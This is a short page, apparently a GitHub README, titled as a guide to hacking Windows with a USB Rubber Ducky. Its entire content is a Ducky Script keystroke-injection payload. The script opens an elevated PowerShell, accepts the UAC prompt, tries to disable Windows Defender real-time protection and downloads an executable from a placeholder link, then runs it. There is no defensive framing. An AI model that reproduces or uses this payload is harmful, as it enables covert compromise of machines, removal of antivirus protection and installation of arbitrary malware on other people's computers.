# Hack Windows Using RubberDucky – Keystroke Injection

### Ducky Script Command Reference
#### FOR MORE INFO VISIT: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads

``` GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 900
STRING Set-MpPreference -DisableRea $true; 
$d = New-Object System.Net.WebClient; 
$f = '1.exe'; 
$d.DownloadFile('YOUR PAYLOAD DOWNLOAD LINK',$f); 
$e = New-Object -com shell.application; $e.shellexecute($f); 
exit; ```
